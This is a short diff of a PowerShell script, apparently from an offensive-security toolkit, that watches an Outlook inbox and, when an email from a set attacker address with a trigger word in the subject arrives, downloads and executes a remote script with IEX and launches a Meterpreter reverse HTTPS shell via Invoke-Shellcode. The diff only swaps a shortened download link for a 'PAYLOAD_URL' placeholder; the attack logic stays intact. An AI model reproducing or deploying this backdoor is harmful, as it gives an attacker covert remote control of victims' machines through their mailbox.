@@ -10,7 +10,7 @@ $Emails = $inbox.items
 $Emails | foreach { 
 if($_.SenderEmailAddress -match $AttackerEmail -and $_.subject -match $TriggerWord)
 {Start-Job -ScriptBlock {$WebClientObject = New-Object Net.WebClient
-IEX $WebClientObject.DownloadString('http://goo.gl/yfLfQB')
+IEX $WebClientObject.DownloadString('PAYLOAD_URL')
 Invoke-Shellcode -Payload windows/meterpreter/reverse_https -LHOST xxx.xxx.xx.xxx -LPORT yyyy -Force}
 }}
 
